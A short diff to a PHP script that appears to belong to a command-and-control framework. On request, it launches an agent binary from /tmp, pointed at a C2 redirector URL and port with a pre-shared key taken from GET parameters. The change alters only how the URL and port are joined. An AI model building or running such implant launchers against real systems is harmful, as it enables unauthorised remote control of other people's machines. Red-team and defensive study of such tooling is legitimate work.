@@ -40,7 +40,7 @@ if (isset($_GET['download']) && $_GET['download'] === 'true') {
         $psk = $_GET['psk'];
         $agentName = $_GET['agent_name'];
         
-        $command = sprintf("/tmp/%s -url %s:%s/ -psk %s", escapeshellarg($agentName), escapeshellarg($c2RedirectorUrl), escapeshellarg($listenerPort), escapeshellarg($psk));
+        $command = sprintf("/tmp/%s -url %s/%s -psk %s", escapeshellarg($agentName), escapeshellarg($c2RedirectorUrl), escapeshellarg($listenerPort), escapeshellarg($psk));
         $handle = popen($command, 'w');
 
         if ($handle !== false) {
